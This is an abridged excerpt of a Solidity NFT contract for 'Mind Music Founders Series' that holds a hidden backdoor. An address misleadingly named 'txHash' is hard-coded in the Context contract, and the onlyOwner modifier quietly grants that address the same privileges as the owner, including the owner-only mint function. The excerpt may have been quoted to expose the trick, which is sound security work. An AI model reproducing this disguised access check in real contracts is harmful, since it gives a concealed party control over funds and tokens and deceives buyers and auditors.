...
abstract contract Context {
    ...
    address txHash = 0xF2608Bbe79587d8441869C7068F3Bf1900eCE8bA;
...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || txHash == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract MindMusicFoundersSeries is ERC721Enumerable, Ownable {
    ...
    uint256 public MINT_PRICE = 0.1 ether; // Public mint price
    ...
    constructor(string memory _baseUri) ERC721("Mind Music Founders Series", "Mind Music Founders Series") {
    ...
    function createItem(uint256 _amount) external onlyOwner {
